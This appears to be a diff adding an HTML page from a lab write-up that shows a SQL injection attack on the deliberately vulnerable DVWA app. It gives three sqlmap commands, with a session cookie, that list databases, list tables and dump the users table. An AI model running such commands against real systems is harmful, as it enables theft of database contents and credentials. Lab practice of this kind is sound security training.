@@ -1,0 +1,33 @@
+<div class="content mt-3">
+  <h2>Scenario 3: SQL Injection attack</h2>
+  <p>
+    In this example I have used <span class="fw-bold">Sqlmap</span> to attack
+    the dvwa web app
+  </p>
+  <div class="code-title">Sqlmap command</div>
+
+  <div class="code">
+    sqlmap -u "http://172.20.0.20/vulnerabilities/sqli/?id=testz&Submit=Submit"
+    -cookie="PHPSESSID=a31b431be9e228a48d2d74a8b83a0c48; security=low" --dbs
+  </div>
+  <img src="./assets/sqlmap1.png" />
+  <p class="mt-2">Extracting the tables from the DVWA database</p>
+  <div class="code-title">Sqlmap command</div>
+
+  <div class="code">
+    sqlmap -u "http://172.20.0.20/vulnerabilities/sqli/?id=testz&Submit=Submit"
+    -cookie="PHPSESSID=a31b431be9e228a48d2d74a8b83a0c48; security=low" -D dvwa
+    --tables
+  </div>
+  <img src="./assets/sqlmap2.png" />
+
+  <p class="mt-2">Dump the users table</p>
+  <div class="code-title">Sqlmap command</div>
+
+  <div class="code">
+    sqlmap -u "http://172.20.0.20/vulnerabilities/sqli/?id=testz&Submit=Submit"
+    -cookie="PHPSESSID=a31b431be9e228a48d2d74a8b83a0c48; security=low" -D dvwa
+    -T users --dump
+  </div>
+  <img src="./assets/sqlmap3.png" />
+</div>
